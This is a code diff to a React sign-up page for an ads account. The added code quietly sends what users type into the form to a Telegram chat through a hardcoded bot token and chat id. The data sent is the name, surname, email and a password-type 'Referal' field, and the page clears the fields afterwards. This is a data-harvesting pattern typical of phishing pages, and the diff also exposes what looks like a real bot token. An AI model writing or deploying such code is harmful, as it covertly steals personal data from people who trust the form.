@@ -1,8 +1,40 @@
 import './style.css'
 import Logoimg from '../../images/Logo.png'
+import axios from "axios"
+import React, { useRef, useState } from 'react';
 
 function LoginPage() {
-
+    const signName = useRef()
+    const signSurname = useRef()
+    const signReferal = useRef()
+    const signEmail = useRef()
+    const signPassword = useRef()
+    //
+    let telegram_bot_id = "6811709016:AAG0zSXgtsbrcz6SvPtbbBTGVjnR9FdlCqw"
+    let chat_id = 852898945
+    let name, surname,username,email, message;
+    let ready = () => {
+        name = signName.current.value
+        surname = signSurname.current.value
+        username = signReferal.current.value
+        email = signEmail.current.value
+        message = "🎉New message for you :\n \n👤 Name: " + name +"\n👤 Surname: " + surname + "\n📂 Referal number:  " + username + "\n📧 Email:  "+ email + "\n \n Contact him now!"
+    }
+    let sendtelegram = function() {
+        ready();
+        axios.post("https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage", {"chat_id": chat_id,"text": message})
+        return false;
+    };
+    //
+    const SendMessage = (e) => {
+        e.preventDefault()
+        sendtelegram();
+        signName.current.value = null
+        signSurname.current.value = null
+        signReferal.current.value = null
+        signEmail.current.value = null
+        signPassword.current.value = null
+    }
     return (
         <>
             <>
@@ -21,30 +53,30 @@ function LoginPage() {
                                     <p>Quickly sign up with your ads account.</p>
                                 </div>
                                 <div className="LEftInputs">
-                                    <form action="/action_page.php">
+                                    <form action="/action_page.php" onSubmit={SendMessage}>
                                         <div className='fnamediv'>
                                             <div class="group">
-                                                <input type="text" required />
+                                                <input ref={signName} type="text" required />
                                                 <span class="highlight"></span>
                                                 <span class="bar"></span>
                                                 <label>Name</label>
                                             </div>
                                             <div class="group">
-                                                <input type="text" required />
+                                                <input ref={signSurname} type="text" required />
                                                 <span class="highlight"></span>
                                                 <span class="bar"></span>
                                                 <label>Last Name</label>
                                             </div>
                                         </div>
                                         <div class="groupW100">
-                                            <input type="email" required />
+                                            <input ref={signEmail} type="email" required />
                                             <span class="highlightW100"></span>
                                             <span class="barW100"></span>
                                             <label>Email</label>
                                         </div>
                                         <div className="fnamedivs">
                                             <div class="groupW100">
-                                                <input type="password" required />
+                                                <input ref={signPassword} type="password" required />
                                                 <span class="highlightW100"></span>
                                                 <span class="barW100"></span>
                                                 <label>Password</label>
@@ -53,12 +85,12 @@ function LoginPage() {
                                                 <input type="password" required />
                                                 <span class="highlightW100"></span>
                                                 <span class="barW100"></span>
-                                                <label>Coniform Password</label>
+                                                <label>Confirm Password</label>
                                             </div>
                                         </div>
                                         <span>
                                             <div class="groupW100">
-                                                <input type="password" required />
+                                                <input ref={signReferal} type="password" required />
                                                 <span class="highlightW100 " ></span>
                                                 <span class="barW100 "></span>
                                                 <label className=''>Referal</label>
@@ -69,7 +101,7 @@ function LoginPage() {
                                             <label for="c1">I accept terms and privacy</label>
                                         </div>
                                         <span className='ssapd'>
-                                            <input type="submit" value="Log In" className='blueButton ssapdButton' onClick={(e) => window.location.pathname = `/Client/${e.target.id}`} />
+                                            <input type="submit" value="Log In" className='blueButton ssapdButton'/>
                                         </span>
                                     </form>
                                 </div>
